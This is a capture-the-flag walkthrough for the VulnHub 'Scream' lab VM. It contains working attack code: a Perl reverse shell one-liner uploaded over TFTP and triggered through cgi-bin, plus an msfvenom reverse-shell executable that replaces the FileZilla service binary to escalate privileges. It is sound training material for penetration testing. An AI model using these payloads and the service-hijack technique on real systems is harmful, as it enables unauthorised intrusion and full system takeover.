# Machine Link
https://www.vulnhub.com/entry/devrandom-scream,47/

# IP
192.168.1.79

# Nmap
Open ports scan :
```bash
nmap -v -p- 192.168.1.79

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
```

Script Scan :
```bash
nmap -v -p- -sC -sV -sT -A 192.168.1.79

PORT   STATE SERVICE VERSION
21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Mar 03 19:01 bin
| drwxr-xr-x 1 ftp ftp              0 Mar 03 19:01 log
|_drwxr-xr-x 1 ftp ftp              0 Mar 03 19:01 root
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
23/tcp open  telnet
| fingerprint-strings: 
|   GenericLines, NCP, RPCCheck, tn3270: 
|     Scream Telnet Service
|     login:
|   GetRequest: 
|     HTTP/1.0
|     Scream Telnet Service
|     login:
|   Help: 
|     HELP
|     Scream Telnet Service
|     login:
|   SIPOptions: 
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     Scream Telnet Service
|_    login:
80/tcp open  http    Tinyweb httpd 1.93
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: TinyWeb/1.93
|_http-title: The Scream - Edvard Munch
```

First lets enumerate ftp port 21 :
```bash
ftp 192.168.1.79 21
	anonymous
	a@a.com
```
<img width="672" height="400" alt="image" src="https://github.com/user-attachments/assets/fea85028-fed0-4ad3-aee0-35fa7194c59f" />

We have anonymous login enabled and found three directories. But none of the content is readable or writeable in these directories.

In the log directory we found a log file named OpenTFTPServerMT.log which indicated that tftp service may be running on the target.
<img width="900" height="301" alt="image" src="https://github.com/user-attachments/assets/e6fa890c-167e-4cd3-ace3-1513c8580fae" />

Lets confirm tftp service through nmap :
```bash
nmap -p 69 -sU 192.168.1.79
```
<img width="1186" height="245" alt="image" src="https://github.com/user-attachments/assets/2f7d8b67-8ee8-4da4-b7e8-ca2c302775bf" />

Now lets see the uploading location of tftp by uploading a demo hello_world text file :
<img width="744" height="290" alt="image" src="https://github.com/user-attachments/assets/cf8b188b-6089-43e4-b701-74cd1651abf5" />
*remember to use verbose and binary mode

Through ftp we confirmed that the hello_world file is uploaded to the root directory, where probably the site is running from the index.html page.
<img width="1038" height="725" alt="image" src="https://github.com/user-attachments/assets/bae19145-a377-4235-9cdd-433418dea2cc" />

Here we also have a cgi-bin directory. And upload searching the web for `Tinyweb httpd 1.93` exploits, i found that the files inside cgi-bin can be executed. So through tftp lets try and upload a perl reverse shell to the target :

vim exploit.pl
```perl
use IO::Socket;
$c=new IO::Socket::INET(PeerAddr,"192.168.1.9:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
```
*Change the ip and port to the listner ip and port.

Lets upload this file through tftp :
<img width="945" height="213" alt="image" src="https://github.com/user-attachments/assets/1ab68127-c104-4417-9c9e-fedc28faae7f" />

# Reverse Shell

Now start a listner and call the file on web location http://IP/cgi-bin/exploit.pl :
<img width="1919" height="1048" alt="image" src="https://github.com/user-attachments/assets/db2b50e6-cbcd-4c30-84c9-97abb6eea418" />

We got the shell!!!

---

# Privilege Escalation

Check the username :

```powershell
echo %username%
```
<img width="400" height="88" alt="image" src="https://github.com/user-attachments/assets/712ef4a0-f4bc-413a-a46c-b29bcc6ab6e4" />

Check the system architecture :
<img width="958" height="877" alt="image" src="https://github.com/user-attachments/assets/d0edab83-c4f7-4593-8de7-3d0f2a88fa48" />
It is a 32 bit system.


Check system tasks running through SYSTEM user.
<img width="835" height="548" alt="image" src="https://github.com/user-attachments/assets/f13818ed-cd8b-47c4-8a81-2b811c3ef0e5" />

To get admin privileges, just need to replace a service file with our payload file.

I will be replacing the FileZilla server.exe file. For this first find the file by :
```powershell
dir "FileZilla server.exe" /s /b
```

But first we need to stop the filezilla service, find its service :
```powershell
net start
```
<img width="860" height="762" alt="image" src="https://github.com/user-attachments/assets/1f3ff6a4-2b0b-4312-8d0e-550afb797826" />

Stop the service :
```powershell
net stop "FileZilla Server FTP server"
```
<img width="822" height="167" alt="image" src="https://github.com/user-attachments/assets/65bc65b8-471d-41fd-ab8b-174662127950" />

First backup the original file :
```powershell
cd C:\\Program Files\\FileZilla Server

rename "FileZilla server.exe" "FileZilla server.exe.bak"
```
<img width="972" height="647" alt="image" src="https://github.com/user-attachments/assets/46ec67ec-a228-45c5-9092-9871160fe42a" />

Now on the main system, generate a reverse shell exe file with msfvenom :
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=1234 -e x86/shikata_ga_nai -f exe > priv_esc.exe
```

Use tftp on attacker system to upload this file to target :

```bash
tftp 192.168.1.79

	verbose
	binary
	put priv_esc.exe
```
<img width="730" height="205" alt="image" src="https://github.com/user-attachments/assets/fda2bc93-d51b-4919-a0a7-3867a1e6fb97" />


Now copy the priv_esc.exe file to `Program Files` → `FileZilla Server` → `FileZilla server.exe`
```powershell
cd C:\\Program Files\\FileZilla Server

copy \\www\\root\\priv_esc.exe "FileZilla server.exe"
```
<img width="926" height="176" alt="image" src="https://github.com/user-attachments/assets/ee8a2950-e84f-4e89-823a-c9ea1ba3ba21" />


Now start the listner on port 1234 and start the filezilla service :
```powershell
net start "FileZilla Server FTP server"
```

<img width="1916" height="1048" alt="image" src="https://github.com/user-attachments/assets/d5c35015-7c1b-4399-8b6f-a22d3ce70202" />

---

Reference :

https://ratiros01.medium.com/vulnhub-dev-random-scream-41bbbb0200e9

---
